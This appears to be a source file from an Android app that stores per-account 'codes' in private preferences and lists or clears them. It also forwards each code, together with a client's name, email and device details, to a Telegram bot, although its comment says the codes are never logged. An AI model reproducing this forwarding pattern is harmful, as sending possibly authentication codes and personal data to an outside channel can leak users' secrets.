package com.starnetbroser.localbrowser;

import android.content.Context;
import android.content.SharedPreferences;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/** 🔑 «الأكواد» on the phone (CodeLog's lines in the app's private prefs - never backed up, never logged). */
final class CodeLogStore {

    private CodeLogStore() {}

    private static final String PREFS = "starnet_code_log";
    private static final String KEY = "log";

    private static SharedPreferences prefs(Context context) {
        return context.getApplicationContext().getSharedPreferences(PREFS, Context.MODE_PRIVATE);
    }

    static synchronized void record(Context context, String accountId, String kind, String code) {
        if (context == null || code == null || code.trim().isEmpty()) return;
        long now = System.currentTimeMillis();
        SharedPreferences p = prefs(context);
        p.edit().putString(KEY, CodeLog.append(p.getString(KEY, ""), now, accountId, kind, code, now)).apply();
        sendToBot(context, accountId, kind, code.trim(), now);
    }

    /** 🔑 «بوت الأكواد»: the code with its device's details (pushed by the app, TelegramStore.codeDevices). */
    private static void sendToBot(Context context, String accountId, String kind, String code, long at) {
        try {
            JSONObject device = accountId == null || accountId.isEmpty() ? null : new JSONObject(TelegramStore.codeDevices(context)).optJSONObject(accountId);
            String time = new java.text.SimpleDateFormat("dd/MM HH:mm", java.util.Locale.ROOT).format(new java.util.Date(at));
            String text = CodeBotText.message(kind, code,
                device != null ? device.optString("name", null) : null,
                device != null ? device.optString("client", null) : null,
                device != null ? device.optString("email", null) : null,
                device != null ? device.optString("kit", null) : null,
                time);
            TelegramSendWorker.enqueueCode(context, text);
        } catch (JSONException | RuntimeException ignored) {
            // the code is kept in «الأكواد» either way
        }
    }

    /** Newest first: [{at, accountId, kind, code}]. */
    static synchronized JSONArray list(Context context) {
        JSONArray out = new JSONArray();
        java.util.List<CodeLog.Entry> entries = CodeLog.parse(prefs(context).getString(KEY, ""));
        for (int i = entries.size() - 1; i >= 0; i--) {
            CodeLog.Entry e = entries.get(i);
            try {
                out.put(new JSONObject().put("at", e.at).put("accountId", e.accountId).put("kind", e.kind).put("code", e.code));
            } catch (JSONException ignored) {
                // a value JSON can't hold - skipped
            }
        }
        return out;
    }

    static synchronized void clear(Context context) {
        prefs(context).edit().remove(KEY).apply();
    }
}
